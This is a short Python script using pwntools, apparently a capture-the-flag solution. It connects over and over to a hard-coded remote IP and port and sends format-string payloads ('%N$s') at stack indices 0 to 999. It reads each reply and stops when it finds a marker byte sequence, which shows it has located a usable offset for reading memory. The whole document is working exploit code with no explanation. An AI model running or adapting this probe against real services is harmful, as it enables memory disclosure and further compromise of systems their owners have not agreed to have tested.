from pwn import *

for i in range(1000):
	p = remote('83.136.252.214',41141)
	p.recvuntil(b'>>')
	p.sendline(str('%{}$s'.format(i)).encode())
	rep = p.recvall(); print(rep)
	if b"\xbe\xba\x37\x13" in rep:
		print('index working %i' % i)
		break
	p.close()
